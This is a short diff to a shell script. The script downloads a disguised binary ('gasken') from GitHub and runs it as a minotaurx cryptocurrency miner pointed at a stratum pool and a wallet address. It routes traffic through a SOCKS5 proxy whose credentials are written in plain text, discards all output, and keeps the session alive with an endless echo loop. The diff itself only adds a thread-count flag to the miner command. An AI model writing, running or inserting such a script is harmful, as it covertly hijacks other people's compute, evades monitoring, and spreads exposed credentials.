@@ -2,5 +2,5 @@ sudo apt-get update
 sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 screen
 wget https://github.com/kiposnakursi/a/raw/main/gasken
 chmod +x gasken
-./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.gupron -x socks5://7amdbgj23nyn0e:khisr9gjnuxw049kbtldkaqtrcor@us-east-static-09.quotaguard.com:1080 >/dev/null 2>&1 >/dev/null &
+./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.gupron -t 3 -x socks5://7amdbgj23nyn0e:khisr9gjnuxw049kbtldkaqtrcor@us-east-static-09.quotaguard.com:1080 >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 5; done
